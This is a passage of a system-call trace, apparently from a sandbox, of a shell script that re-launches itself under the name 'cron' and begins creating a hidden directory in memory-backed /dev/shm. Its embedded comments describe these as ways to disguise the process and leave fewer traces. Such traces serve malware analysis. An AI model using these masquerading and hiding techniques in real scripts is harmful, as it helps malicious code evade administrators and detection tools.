9     14:56:48.936946 wait4(-1, 0x7ffd8d3af5d0, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     14:56:48.937327 rt_sigreturn({mask=[INT]}) = 0
9     14:56:48.937662 close(3<pipe:[586]>) = 0
9     14:56:48.938031 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.938338 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:48.938686 rt_sigaction(SIGINT, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.939033 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.939369 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.939804 read(255</sandbox/sample.sh>, "\n\n# Use exec -a to rename the pr"..., 1423) = 813
9     14:56:48.940740 pipe2([3<pipe:[589]>, 4<pipe:[589]>], 0) = 0
9     14:56:48.941144 fcntl(4<pipe:[589]>, F_GETPIPE_SZ) = 65536
9     14:56:48.941477 write(4<pipe:[589]>, "    # This runs in a new process"..., 809) = 809
9     14:56:48.941817 close(4<pipe:[589]>) = 0
9     14:56:48.942147 fcntl(0</dev/null>, F_GETFD) = 0
9     14:56:48.942536 fcntl(0</dev/null>, F_DUPFD, 10) = 10</dev/null>
9     14:56:48.943052 fcntl(0</dev/null>, F_GETFD) = 0
9     14:56:48.943456 fcntl(10</dev/null>, F_SETFD, FD_CLOEXEC) = 0
9     14:56:48.943853 dup2(3<pipe:[589]>, 0</dev/null>) = 0<pipe:[589]>
9     14:56:48.944236 close(3<pipe:[589]>) = 0
9     14:56:48.944590 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.945014 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.945370 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.945709 execve("/bin/bash", ["cron"], 0x5efc23a74000 /* 8 vars */) = 0
9     14:56:48.946955 brk(NULL)         = 0x63f037b01000
9     14:56:48.947352 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x79f014486000
9     14:56:48.947710 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
9     14:56:48.948312 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     14:56:48.948796 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
9     14:56:48.949286 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x79f014481000
9     14:56:48.949624 mmap(0x79f014482000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x79f014482000
9     14:56:48.949968 mmap(0x79f014483000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x79f014483000
9     14:56:48.950305 mmap(0x79f014484000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x79f014484000
9     14:56:48.950685 close(3</usr/lib/libfake_tracer.so>) = 0
9     14:56:48.951019 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9     14:56:48.951359 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
9     14:56:48.951712 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
9     14:56:48.952158 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x79f01447f000
9     14:56:48.952499 close(3</etc/ld.so.cache>) = 0
9     14:56:48.952835 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtinfo.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>
9     14:56:48.953196 read(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     14:56:48.953533 fstat(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, {st_mode=S_IFREG|0644, st_size=208328, ...}) = 0
9     14:56:48.953869 mmap(NULL, 211240, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0) = 0x79f01444b000
9     14:56:48.954201 mmap(0x79f014459000, 77824, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0xe000) = 0x79f014459000
9     14:56:48.954543 mmap(0x79f01446c000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x21000) = 0x79f01446c000
9     14:56:48.954927 mmap(0x79f01447a000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x2e000) = 0x79f01447a000
9     14:56:48.955282 close(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>) = 0
9     14:56:48.955646 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
9     14:56:48.956025 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
9     14:56:48.956418 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     14:56:48.957197 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
9     14:56:48.957747 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     14:56:48.958268 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x79f014239000
9     14:56:48.958830 mmap(0x79f014261000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x79f014261000
9     14:56:48.959403 mmap(0x79f0143e9000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x79f0143e9000
9     14:56:48.959891 mmap(0x79f014438000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x79f014438000
9     14:56:48.960374 mmap(0x79f01443e000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x79f01443e000
9     14:56:48.960770 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
9     14:56:48.961178 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x79f014237000
9     14:56:48.961545 arch_prctl(ARCH_SET_FS, 0x79f014237b80) = 0
9     14:56:48.961872 set_tid_address(0x79f014237e50) = 9
9     14:56:48.962192 set_robust_list(0x79f014237e60, 24) = 0
9     14:56:48.962512 rseq(0x79f0142384a0, 0x20, 0, 0x53053053) = 0
9     14:56:48.962945 mprotect(0x79f014438000, 16384, PROT_READ) = 0
9     14:56:48.963328 mprotect(0x79f01447a000, 16384, PROT_READ) = 0
9     14:56:48.963661 mprotect(0x79f014484000, 4096, PROT_READ) = 0
9     14:56:48.964105 mprotect(0x63f00de94000, 16384, PROT_READ) = 0
9     14:56:48.964455 mprotect(0x79f0144be000, 8192, PROT_READ) = 0
9     14:56:48.964811 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
9     14:56:48.965169 munmap(0x79f01447f000, 7295) = 0
9     14:56:48.965551 openat(AT_FDCWD</sandbox>, "/dev/tty", O_RDWR|O_NONBLOCK) = -1 ENXIO (No such device or address)
9     14:56:48.965937 ioctl(0<pipe:[589]>, TCGETS, 0x7fff19399320) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.966290 getrandom("\xfe\x20\x43\xc4\xcb\x0a\x25\x4d", 8, GRND_NONBLOCK) = 8
9     14:56:48.966700 brk(NULL)         = 0x63f037b01000
9     14:56:48.967102 brk(0x63f037b22000) = 0x63f037b22000
9     14:56:48.967457 getuid()          = 1001
9     14:56:48.967781 getgid()          = 1001
9     14:56:48.968125 geteuid()         = 1001
9     14:56:48.968448 getegid()         = 1001
9     14:56:48.968779 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.969130 ioctl(0<pipe:[589]>, TCGETS, 0x7fff19399340) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.969493 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.969889 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.970229 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.970567 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.971017 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.971351 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.971686 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.972038 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.972378 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.972709 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.973074 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.973576 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.974013 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.974432 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.974892 uname({sysname="Linux", nodename="97c4bc2edabd", ...}) = 0
9     14:56:48.975354 newfstatat(AT_FDCWD</sandbox>, "/sandbox", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.975744 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.976093 newfstatat(AT_FDCWD</sandbox>, "/sandbox", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.976452 getpid()          = 9
9     14:56:48.976887 getppid()         = 1
9     14:56:48.977229 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.977578 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/cron", 0x7fff19398ee0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.977948 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/cron", 0x7fff19398ee0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.978294 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/cron", 0x7fff19398ee0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.978673 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/cron", 0x7fff19398ee0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.979024 newfstatat(AT_FDCWD</sandbox>, "/sbin/cron", 0x7fff19398ee0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.979404 newfstatat(AT_FDCWD</sandbox>, "/bin/cron", 0x7fff19398ee0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.979744 newfstatat(AT_FDCWD</sandbox>, "cron", 0x7fff193990d0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.980109 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[590]>
9     14:56:48.980463 connect(3<socket:[590]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     14:56:48.980882 close(3<socket:[590]>) = 0
9     14:56:48.981236 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[591]>
9     14:56:48.981576 connect(3<socket:[591]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     14:56:48.981956 close(3<socket:[591]>) = 0
9     14:56:48.982320 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
9     14:56:48.982667 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.983039 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
9     14:56:48.983397 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     14:56:48.983738 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
9     14:56:48.984090 read(3</etc/nsswitch.conf>, "", 4096) = 0
9     14:56:48.984503 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     14:56:48.984948 close(3</etc/nsswitch.conf>) = 0
9     14:56:48.985379 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
9     14:56:48.985773 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
9     14:56:48.986114 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
9     14:56:48.986445 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
9     14:56:48.986900 close(3</etc/passwd>) = 0
9     14:56:48.987278 getpid()          = 9
9     14:56:48.987601 getppid()         = 1
9     14:56:48.987921 getpid()          = 9
9     14:56:48.988241 getppid()         = 1
9     14:56:48.988598 getpgrp()         = 1
9     14:56:48.988922 ioctl(2<pipe:[2810]>, TIOCGPGRP, 0x7fff19399234) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.989342 rt_sigaction(SIGCHLD, {sa_handler=0x63f00dda6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:48.989681 ioctl(2<pipe:[2810]>, TIOCGPGRP, 0x7fff193991e4) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.990440 prlimit64(0, RLIMIT_NPROC, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
9     14:56:48.991007 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.991498 fcntl(0<pipe:[589]>, F_GETFL) = 0 (flags O_RDONLY)
9     14:56:48.991971 fstat(0<pipe:[589]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
9     14:56:48.992393 lseek(0<pipe:[589]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9     14:56:48.992799 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.993218 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.993604 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.993946 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.994295 read(0<pipe:[589]>, "#", 1) = 1
9     14:56:48.994678 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.995095 read(0<pipe:[589]>, "T", 1) = 1
9     14:56:48.995456 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:48.995820 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:48.996155 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:48.996491 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.996877 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:48.997255 read(0<pipe:[589]>, "u", 1) = 1
9     14:56:48.997620 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:48.997973 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:48.998309 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.998663 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:48.999021 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:48.999356 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:48.999690 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.000028 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.000361 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.000694 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.001049 read(0<pipe:[589]>, "w", 1) = 1
9     14:56:49.001384 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.001717 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.002051 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.002384 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.002757 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.003101 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.003444 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.003786 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.004150 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.004495 read(0<pipe:[589]>, "w", 1) = 1
9     14:56:49.004841 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.005183 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.005581 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.006033 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.006514 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.007057 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.007532 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.007925 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.008417 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.008769 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.009129 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.009475 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.009820 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.010165 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.010541 read(0<pipe:[589]>, "\"", 1) = 1
9     14:56:49.010926 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.011278 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.011620 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.011964 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.012308 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.012651 read(0<pipe:[589]>, "#", 1) = 1
9     14:56:49.012994 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.013338 read(0<pipe:[589]>, "U", 1) = 1
9     14:56:49.013682 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.014057 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.014420 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.014798 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.015134 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.015469 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.015802 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.016137 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.016470 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.016854 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.017195 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.017530 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.017863 read(0<pipe:[589]>, "f", 1) = 1
9     14:56:49.018196 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.018530 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.018924 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.019263 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.019640 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.019975 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.020308 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.020692 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.021030 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.021363 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.021695 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.022028 read(0<pipe:[589]>, "y", 1) = 1
9     14:56:49.022364 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.022716 read(0<pipe:[589]>, "f", 1) = 1
9     14:56:49.023055 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.023785 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.024354 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.024779 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.025209 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.025597 read(0<pipe:[589]>, "(", 1) = 1
9     14:56:49.025942 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.026278 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.026643 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.026988 read(0<pipe:[589]>, "o", 1) = 1
9     14:56:49.027304 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.027611 read(0<pipe:[589]>, "y", 1) = 1
9     14:56:49.027915 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.028217 read(0<pipe:[589]>, "b", 1) = 1
9     14:56:49.028519 read(0<pipe:[589]>, "a", 1) = 1
9     14:56:49.028820 read(0<pipe:[589]>, "c", 1) = 1
9     14:56:49.029122 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.029424 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.029726 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.030029 read(0<pipe:[589]>, ",", 1) = 1
9     14:56:49.030330 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.030693 read(0<pipe:[589]>, "l", 1) = 1
9     14:56:49.031048 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.031383 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.031719 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.032052 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.032384 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.032718 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.033050 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.033382 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.033743 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.034075 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.034408 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.034753 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.035086 read(0<pipe:[589]>, "n", 1) = 1
9     14:56:49.035418 read(0<pipe:[589]>, "t", 1) = 1
9     14:56:49.035828 read(0<pipe:[589]>, ")", 1) = 1
9     14:56:49.036209 read(0<pipe:[589]>, "\n", 1) = 1
9     14:56:49.036561 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.036958 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.037304 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.037639 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.037983 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.038316 read(0<pipe:[589]>, "k", 1) = 1
9     14:56:49.038664 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.039004 read(0<pipe:[589]>, "i", 1) = 1
9     14:56:49.039337 read(0<pipe:[589]>, "r", 1) = 1
9     14:56:49.039680 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.040212 read(0<pipe:[589]>, "-", 1) = 1
9     14:56:49.040706 read(0<pipe:[589]>, "p", 1) = 1
9     14:56:49.041092 read(0<pipe:[589]>, " ", 1) = 1
9     14:56:49.041431 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.041767 read(0<pipe:[589]>, "d", 1) = 1
9     14:56:49.042101 read(0<pipe:[589]>, "e", 1) = 1
9     14:56:49.042436 read(0<pipe:[589]>, "v", 1) = 1
9     14:56:49.042817 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.043154 read(0<pipe:[589]>, "s", 1) = 1
9     14:56:49.043488 read(0<pipe:[589]>, "h", 1) = 1
9     14:56:49.043820 read(0<pipe:[589]>, "m", 1) = 1
9     14:56:49.044153 read(0<pipe:[589]>, "/", 1) = 1
9     14:56:49.044485 read(0<pipe:[589]>, ".", 1) = 1
9     14:56:49.044820 read(0<pipe:[589]>, "c", 1) = 1
